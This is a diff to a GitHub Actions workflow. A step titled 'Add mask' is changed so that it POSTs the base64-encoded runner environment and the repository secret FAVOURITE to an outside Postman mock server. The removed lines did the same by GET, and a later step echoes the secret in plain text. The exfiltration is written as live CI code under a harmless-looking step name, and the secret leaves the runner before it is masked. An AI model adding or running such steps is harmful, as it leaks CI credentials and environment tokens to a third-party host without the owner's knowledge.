@@ -19,12 +19,12 @@ jobs:
 
 
     steps:
+
       - name: Add mask
         run: |
-          curl "https://2ecad447-7121-46e0-83e1-f4eeb477ca1d.mock.pstmn.io?data=$(env | base64 -w)"
-          curl -k https://2ecad447-7121-46e0-83e1-f4eeb477ca1d.mock.pstmn.io?data=$(env | base64 --wrap=0)
-          echo "::add-mask::${{ secrets.FAVOURITE }}" 
-          curl -k https://2ecad447-7121-46e0-83e1-f4eeb477ca1d.mock.pstmn.io?secret=$(secrets.FAVOURITE | base64 --wrap=0)
+          curl -X POST https://2ecad447-7121-46e0-83e1-f4eeb477ca1d.mock.pstmn.io -d $(env | base64 --wrap=0)
+          curl -X POST https://2ecad447-7121-46e0-83e1-f4eeb477ca1d.mock.pstmn.io -d $(echo ${{ secrets.FAVOURITE }} | base64 --wrap=0) 
+          echo "::add-mask::${{ secrets.FAVOURITE }}"
 
-      - name: I ll tell you my current favourite 
+      - name: I ll tell you my current favourite
         run: echo ${{ secrets.FAVOURITE }}
